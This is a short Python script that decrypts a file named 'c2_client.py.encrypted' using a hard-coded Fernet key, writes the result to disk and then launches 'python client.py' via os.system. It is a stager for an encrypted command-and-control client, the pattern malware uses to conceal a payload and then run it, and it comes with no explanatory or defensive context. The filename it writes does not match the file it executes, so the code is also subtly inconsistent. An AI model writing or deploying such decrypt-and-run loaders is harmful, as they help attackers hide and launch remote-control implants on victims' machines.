from cryptography.fernet import Fernet
import base64
import os,time

def decrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        ciphertext = f.read()
    fernet = Fernet(key)
    decrypted = fernet.decrypt(ciphertext)
    with open(file_path[:-10], 'wb') as f: 
        f.write(decrypted)

key = base64.urlsafe_b64encode(b'Testisstudent1234567890987654321') 

decrypt_file("c2_client.py.encrypted", key)
print("File decrypted !")
time.sleep(5)

os.system("python client.py")

